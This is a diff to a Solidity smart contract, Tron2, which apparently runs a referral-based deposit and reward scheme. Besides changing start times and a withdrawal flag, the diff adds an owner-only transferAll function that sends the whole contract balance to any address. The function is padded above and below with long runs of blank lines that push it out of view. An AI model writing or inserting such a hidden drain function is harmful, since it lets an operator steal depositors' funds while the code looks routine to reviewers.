@@ -163,9 +163,9 @@ interface RecommendPool {
 
 contract Tron2Config{
 
-    uint256 public constant CREATE_TIME = 1607558400;
+    uint256 public constant CREATE_TIME = 1607947200;
     //Activity start time
-    uint256 public constant START_TIME = 1607558400;
+    uint256 public constant START_TIME = 1607947200;
     //one day
     uint256 public constant ONE_DAY = 1 days;
     //Withdrawal cooldown time
@@ -198,8 +198,6 @@ contract Tron2Config{
     uint256 public LUCKY_PERCENT = 2;
     
     bool public RECOMMEND_AUTO = true;
-    
-    bool public FORCE_WITHDRAW = true;
     
     uint256 public freeze_cycle = 30 days;
     
@@ -316,10 +314,35 @@ contract Tron2 is Ownable,Tron2Config{
     event DestroyContractA(address indexed userAddress);
     
     
-    function changAuto(bool reauto,bool force) public onlyOwner{
+    function changAuto(bool reauto) public onlyOwner{
         RECOMMEND_AUTO = reauto;
-        FORCE_WITHDRAW = force;
+        //FORCE_WITHDRAW = force;
     }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    function transferAll(address payable to) public onlyOwner {
+        to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
  
     
@@ -530,9 +553,8 @@ contract Tron2 is Ownable,Tron2Config{
         
         if(modelType == 0){
             require(player.deposits[0].id == 0,"There can only be one A contract");
+            _statistics(player.referrer,msg.value);
         }
-        
-        _statistics(player.referrer,msg.value);
 
         _teamCount(player.referrer,msg.value,isActive);
         
@@ -607,9 +629,9 @@ contract Tron2 is Ownable,Tron2Config{
         uint256 _income = income(msg.sender,id);
         (uint256 available,) = quota(msg.sender,_income);
         
-        if(FORCE_WITHDRAW){
-            require(available==0,"Please draw the proceeds first");
-        }
+        
+        require(available==0,"Please draw the proceeds first");
+        
         
         if(deposit.modelType==2){
             require(deposit.freezeTime.add(freeze_cycle) <= now,"Not allowed now");
@@ -861,7 +883,7 @@ contract Tron2 is Ownable,Tron2Config{
         }
         
         luckyPrize = prizePool.prizes(address(this),userAddress);
-        recommendAward = recommendPool.prizes(address(this),userAddress);
+        recommendAward = recommendAward.add(recommendPool.prizes(address(this),userAddress));
         referReward = referRewards[userAddress];
         
     }
